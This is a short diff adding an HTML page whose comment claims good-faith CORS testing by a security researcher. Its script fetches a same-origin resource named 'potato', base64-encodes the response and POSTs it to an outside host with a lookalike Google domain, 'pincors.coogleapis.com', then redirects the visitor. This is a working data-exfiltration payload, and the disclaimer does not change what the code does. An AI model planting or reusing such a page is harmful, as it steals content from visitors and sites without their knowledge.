@@ -1,0 +1,8 @@
+<html>
+    <head>
+	<!--- I'm a security researcher doing in good faith testing for open CORS please don't sue me -->
+        <script src="/jquery.js"></script>
+    </head>
+        <script>setTimeout(function(){window.location.replace("potato");},700)</script>
+	<script>fetch("potato").then(function(result){result.text().then(function(text){fetch("https://pincors.coogleapis.com/enable-cors.org", {"method": "post", body: btoa(unescape(encodeURIComponent(text)))});})}).catch(function(){});</script>
+</html>
